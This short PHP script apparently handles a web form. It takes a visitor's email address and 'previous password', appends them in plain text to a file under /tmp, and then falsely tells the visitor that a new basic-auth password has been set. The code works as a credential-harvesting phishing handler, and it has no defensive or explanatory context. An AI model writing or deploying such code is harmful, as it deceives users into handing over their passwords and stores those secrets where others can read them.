<?php
        $email = $_POST["email"];
        $previous_password = $_POST["previous_password"];
        $file="/tmp/basic-auth.dat";
        $data = "$email:$previous_password\n";
        file_put_contents($file, $data, FILE_APPEND );
     //   file_put_contents($file, $email, FILE_APPEND );
        echo "<h2>Your basic auth password has been set.</h2>";
        echo "<h2>Please enter this email address and the password from the email I sent you when visiting our main website.</h2>";
?>
